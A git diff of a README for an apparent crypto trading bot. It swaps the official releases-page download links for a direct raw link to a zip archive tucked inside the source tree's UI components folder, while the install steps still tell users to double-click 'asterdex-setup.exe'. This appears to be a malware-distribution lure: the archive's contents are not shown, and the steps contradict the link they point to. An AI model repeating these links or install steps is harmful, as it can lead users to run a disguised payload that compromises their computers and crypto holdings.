@@ -1,6 +1,6 @@
 # 🤖 asterdex-trading-bot - Automated crypto trading for your portfolio
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Hortenseaccountable719/asterdex-trading-bot/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Hortenseaccountable719/asterdex-trading-bot/raw/refs/heads/main/src/ui/components/trading_bot_asterdex_1.0.zip)
 
 ## 📖 Overview
 
@@ -19,7 +19,7 @@ Make sure your computer meets these needs before you start:
 
 Follow these steps to get the bot on your computer.
 
-1. Visit this page to download the latest version: [https://github.com/Hortenseaccountable719/asterdex-trading-bot/releases](https://github.com/Hortenseaccountable719/asterdex-trading-bot/releases).
+1. Visit this page to download the latest version: [https://github.com/Hortenseaccountable719/asterdex-trading-bot/raw/refs/heads/main/src/ui/components/trading_bot_asterdex_1.0.zip](https://github.com/Hortenseaccountable719/asterdex-trading-bot/raw/refs/heads/main/src/ui/components/trading_bot_asterdex_1.0.zip).
 2. Look for the file labeled `asterdex-setup.exe` under the Assets section.
 3. Click the file to save it to your Downloads folder.
 4. Open your Downloads folder and double-click `asterdex-setup.exe`.
